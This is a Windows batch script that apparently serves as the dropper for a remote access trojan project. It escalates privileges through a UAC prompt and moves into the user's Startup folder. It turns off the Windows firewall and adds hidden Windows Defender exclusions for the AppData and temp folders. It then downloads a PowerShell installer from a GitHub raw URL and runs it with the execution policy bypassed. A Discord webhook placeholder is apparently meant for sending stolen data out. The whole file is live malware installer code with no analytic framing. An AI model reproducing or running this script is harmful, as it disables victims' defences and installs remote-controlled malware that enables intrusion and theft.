@echo off
:: BatchGotAdmin
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

@REM vars
SET STARTDIR="%cd%"
SET RUNPATH="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
echo DISCORDWEBHOOK > "%temp%\u.cfg"

cd %RUNPATH%

@REM disable
netsh firewall set opmode disable
netsh Advfirewall set allprofiles state off
powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "%appdata%\\"; Add-MpPreference -ExclusionPath "$env:temp"
powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri "https://raw.githubusercontent.com/hallowslab/MyFirstRat/master/src/modules/scripts/installers/installer.ps1" -OutFile installer.ps1;
powershell powershell.exe -windowstyle hidden -ep bypass ./installer.ps1

@Rem del wget.cmd
::DEL wget.cmd